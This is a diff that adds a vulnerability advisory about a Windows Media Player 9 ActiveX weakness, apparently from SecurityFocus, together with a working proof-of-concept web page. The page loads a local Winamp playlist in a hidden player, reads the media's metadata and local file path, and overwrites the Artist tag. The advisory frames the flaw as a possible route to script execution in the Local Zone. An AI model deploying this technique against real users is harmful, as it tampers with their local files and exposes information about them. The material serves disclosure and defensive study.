@@ -1,0 +1,56 @@
+source: http://www.securityfocus.com/bid/12031/info
+
+The Windows Media Player ActiveX control is prone to a security weakness. The issue is that the control may be abused by a Web page to change attributes of media files (such as MP3). An attacker can influence attributes such as the artist, song name, or album name.
+
+It is possible to exploit this weakness to inject malicious script code into these attributes. If this issue was combined with a vulnerability that could force Internet Explorer to interpret the injected script code, it may be possible to execute malicious script code in the Local Zone. Such an attack would lead to execution of arbitrary code on computers that do not have this Zone locked down.
+
+This issue is reported to affect Windows Media Player 9. It reportedly does not work on computers running Windows XP SP2 when the attack is executed from a remote source. This is likely due to additional browser security measures in Windows XP SP2. 
+
+<object style="display:none;"
+classid="clsid:6BF52A52-394A-11D3-B153-00C04F79FAA6"
+id="WindowsMediaPlayer">
+<param name="autoStart" value="1">
+<param name="url" value="file://c:\program files\winamp\winamp.m3u">
+<param name="mute" value="1">
+</object>
+
+<script>
+
+note = 'Look at yourself and find the mortality of your body';
+
+setTimeout(
+function(){
+if (WindowsMediaPlayer.currentMedia.sourceURL!='c:\\program files\\winamp\\winamp.m3u')
+{
+artist = WindowsMediaPlayer.currentMedia.getItemInfo("Artist");
+title = WindowsMediaPlayer.currentMedia.getItemInfo("Title");
+album = WindowsMediaPlayer.currentMedia.getItemInfo("Album");
+texxt = "";
+if (artist!=note)
+{
+if (artist!="")
+texxt='I like '+artist+'!\n';
+if (title!="")
+texxt=texxt+'I think '+title+' is the best song';
+if ((title!="")&&(album!=""))
+texxt=texxt+' from ';
+if (album!="")
+texxt=texxt+'My favorite album "'+album+'".\n';
+else
+texxt=texxt+'.\n';
+texxt=texxt+'I have it on my computer ('+WindowsMediaPlayer.currentMedia.sourceURL+'), I guess you have it too! ;)';
+alert(texxt);
+}
+WindowsMediaPlayer.currentMedia.setItemInfo("Artist",note);
+alert('done!\nplay '+WindowsMediaPlayer.currentMedia.sourceURL+' by a player and take a look at artist name, it must be changed!');
+WindowsMediaPlayer.controls.stop();
+WindowsMediaPlayer.controls.play();
+}
+else
+alert('Can\'t find winamp default playlist!\nMost probably the winamp is not installed in c:\\program files\\winamp directory.');
+}
+,2000);
+</script>
+
+
+</body></html> 
